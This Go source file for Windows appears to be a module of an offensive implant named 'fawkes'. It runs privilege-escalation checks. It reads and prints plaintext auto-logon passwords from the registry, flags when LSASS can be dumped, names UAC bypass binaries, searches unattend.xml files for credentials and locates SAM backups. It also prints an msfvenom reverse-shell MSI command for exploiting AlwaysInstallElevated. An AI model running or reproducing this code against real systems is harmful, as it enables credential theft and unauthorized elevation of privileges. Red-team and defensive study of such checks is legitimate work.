//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// winPrivescCheckRegistry checks registry for AlwaysInstallElevated, auto-logon, etc.
func winPrivescCheckRegistry() structs.CommandResult {
	var sb strings.Builder
	findings := 0

	// Check AlwaysInstallElevated (HKLM and HKCU both must be set)
	sb.WriteString("AlwaysInstallElevated:\n")
	hklmElevated := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Policies\Microsoft\Windows\Installer`, "AlwaysInstallElevated")
	hkcuElevated := readRegDWORD(windows.HKEY_CURRENT_USER, `SOFTWARE\Policies\Microsoft\Windows\Installer`, "AlwaysInstallElevated")

	if hklmElevated == 1 && hkcuElevated == 1 {
		sb.WriteString("  [!!] BOTH HKLM and HKCU AlwaysInstallElevated = 1\n")
		sb.WriteString("  Any user can install MSI packages with SYSTEM privileges!\n")
		sb.WriteString("  Exploit: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi\n")
		findings++
	} else {
		if hklmElevated == 1 {
			sb.WriteString("  [*] HKLM AlwaysInstallElevated = 1 (HKCU not set — not exploitable alone)\n")
		} else if hkcuElevated == 1 {
			sb.WriteString("  [*] HKCU AlwaysInstallElevated = 1 (HKLM not set — not exploitable alone)\n")
		} else {
			sb.WriteString("  Not enabled (safe)\n")
		}
	}

	// Check auto-logon credentials
	sb.WriteString("\nAuto-Logon Credentials:\n")
	autoUser := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "DefaultUserName")
	autoPass := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "DefaultPassword")
	autoDomain := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "DefaultDomainName")
	autoLogon := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "AutoAdminLogon")

	if autoLogon == "1" && autoUser != "" {
		sb.WriteString(fmt.Sprintf("  [!!] Auto-logon ENABLED\n"))
		sb.WriteString(fmt.Sprintf("  Domain:   %s\n", autoDomain))
		sb.WriteString(fmt.Sprintf("  Username: %s\n", autoUser))
		if autoPass != "" {
			sb.WriteString(fmt.Sprintf("  Password: %s\n", autoPass))
			findings++
		} else {
			sb.WriteString("  Password: (not stored in plaintext — may use LSA secret)\n")
		}
	} else if autoUser != "" {
		sb.WriteString(fmt.Sprintf("  [*] Default username set: %s (auto-logon not enabled)\n", autoUser))
	} else {
		sb.WriteString("  Not configured\n")
	}

	// Check for stored credentials in WinLogon (additional locations)
	sb.WriteString("\nLSA Protection:\n")
	runAsPPL := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, "RunAsPPL")
	if runAsPPL == 1 {
		sb.WriteString("  [*] LSA Protection (RunAsPPL) is ENABLED — LSASS is protected\n")
	} else {
		sb.WriteString("  [!] LSA Protection (RunAsPPL) is NOT enabled — LSASS can be dumped\n")
		findings++
	}

	// Credential Guard
	lsaCfgFlags := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\LSA`, "LsaCfgFlags")
	if lsaCfgFlags >= 1 {
		sb.WriteString("  [*] Credential Guard is ENABLED — credential theft is harder\n")
	} else {
		sb.WriteString("  Credential Guard is not enabled\n")
	}

	// WSUS configuration (potential for compromise if using HTTP)
	sb.WriteString("\nWSUS Configuration:\n")
	wuServer := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate`, "WUServer")
	if wuServer != "" {
		sb.WriteString(fmt.Sprintf("  WSUS Server: %s\n", wuServer))
		if strings.HasPrefix(strings.ToLower(wuServer), "http://") {
			sb.WriteString("  [!!] WSUS is using HTTP (not HTTPS) — vulnerable to WSUS attacks\n")
			findings++
		}
	} else {
		sb.WriteString("  Not configured (using Microsoft Update directly)\n")
	}

	if findings > 0 {
		sb.WriteString(fmt.Sprintf("\n[!] %d exploitable registry finding(s) detected", findings))
	}

	return successResult(sb.String())
}

// winPrivescCheckUAC reports the current UAC configuration
func winPrivescCheckUAC() structs.CommandResult {
	var sb strings.Builder

	enableLUA := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "EnableLUA")
	consentPromptBehavior := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "ConsentPromptBehaviorAdmin")
	promptOnSecureDesktop := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "PromptOnSecureDesktop")
	filterAdminToken := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "FilterAdministratorToken")

	if enableLUA == 0 {
		sb.WriteString("[!!] UAC is DISABLED (EnableLUA = 0)\n")
		sb.WriteString("All admin users run with full admin privileges — no elevation needed\n")
	} else {
		sb.WriteString("UAC is enabled (EnableLUA = 1)\n")

		sb.WriteString(fmt.Sprintf("\nAdmin consent prompt behavior: "))
		switch consentPromptBehavior {
		case 0:
			sb.WriteString("Elevate without prompting (0)\n")
			sb.WriteString("[!!] Auto-elevation — UAC bypass is trivial (silent elevation)\n")
		case 1:
			sb.WriteString("Prompt for credentials on secure desktop (1)\n")
		case 2:
			sb.WriteString("Prompt for consent on secure desktop (2)\n")
		case 3:
			sb.WriteString("Prompt for credentials (3)\n")
		case 4:
			sb.WriteString("Prompt for consent (4)\n")
		case 5:
			sb.WriteString("Prompt for consent for non-Windows binaries (5) — DEFAULT\n")
			sb.WriteString("[*] Standard config — UAC bypass via auto-elevating binaries possible (fodhelper, computerdefaults, sdclt)\n")
		default:
			sb.WriteString(fmt.Sprintf("Unknown (%d)\n", consentPromptBehavior))
		}

		if promptOnSecureDesktop == 0 {
			sb.WriteString("[*] Secure desktop is DISABLED — easier to interact with UAC prompt programmatically\n")
		}

		if filterAdminToken == 0 {
			sb.WriteString("[*] Built-in Administrator account is NOT filtered (RID 500 bypass)\n")
			sb.WriteString("    If running as built-in Administrator, you already have full admin without UAC\n")
		}
	}

	return successResult(sb.String())
}

// winPrivescCheckUnattend checks for unattended install files containing credentials
func winPrivescCheckUnattend() structs.CommandResult {
	var sb strings.Builder

	systemRoot := os.Getenv("SystemRoot")
	if systemRoot == "" {
		systemRoot = `C:\Windows`
	}
	systemDrive := os.Getenv("SystemDrive")
	if systemDrive == "" {
		systemDrive = `C:`
	}

	unattendPaths := []string{
		filepath.Join(systemRoot, "Panther", "Unattend.xml"),
		filepath.Join(systemRoot, "Panther", "unattend.xml"),
		filepath.Join(systemRoot, "Panther", "Unattended.xml"),
		filepath.Join(systemRoot, "Panther", "unattended.xml"),
		filepath.Join(systemRoot, "Panther", "Autounattend.xml"),
		filepath.Join(systemRoot, "System32", "Sysprep", "unattend.xml"),
		filepath.Join(systemRoot, "System32", "Sysprep", "Unattend.xml"),
		filepath.Join(systemRoot, "System32", "Sysprep", "Panther", "unattend.xml"),
		filepath.Join(systemDrive, "unattend.xml"),
		filepath.Join(systemDrive, "Autounattend.xml"),
	}

	var found []string
	for _, path := range unattendPaths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		content := string(data)
		structs.ZeroBytes(data)
		hasPassword := strings.Contains(strings.ToLower(content), "<password>") ||
			strings.Contains(strings.ToLower(content), "cpassword") ||
			strings.Contains(strings.ToLower(content), "adminpassword")

		entry := fmt.Sprintf("  %s (%d bytes)", path, len(data))
		if hasPassword {
			entry += "\n    [!!] Contains password fields — credentials may be recoverable"
		}
		found = append(found, entry)
	}

	sb.WriteString(fmt.Sprintf("Unattended install files (%d found):\n", len(found)))
	if len(found) > 0 {
		sb.WriteString(strings.Join(found, "\n"))
		sb.WriteString("\n\nUse 'cat' to read the file and look for <Password> or <AutoLogon> sections")
	} else {
		sb.WriteString("  (none found)")
	}

	// Check for other interesting files
	var interestingFiles []string
	otherPaths := []struct {
		path string
		desc string
	}{
		{filepath.Join(systemRoot, "repair", "SAM"), "SAM backup"},
		{filepath.Join(systemRoot, "repair", "SYSTEM"), "SYSTEM backup"},
		{filepath.Join(systemRoot, "debug", "NetSetup.log"), "Domain join log (may contain creds)"},
		{filepath.Join(systemDrive, "inetpub", "wwwroot", "web.config"), "IIS web.config"},
	}

	for _, f := range otherPaths {
		if info, err := os.Stat(f.path); err == nil {
			if isFileReadable(f.path) {
				interestingFiles = append(interestingFiles, fmt.Sprintf("  %s — %s (%d bytes)", f.path, f.desc, info.Size()))
			}
		}
	}

	if len(interestingFiles) > 0 {
		sb.WriteString(fmt.Sprintf("\n\nOther interesting files (%d):\n", len(interestingFiles)))
		sb.WriteString(strings.Join(interestingFiles, "\n"))
	}

	return successResult(sb.String())
}
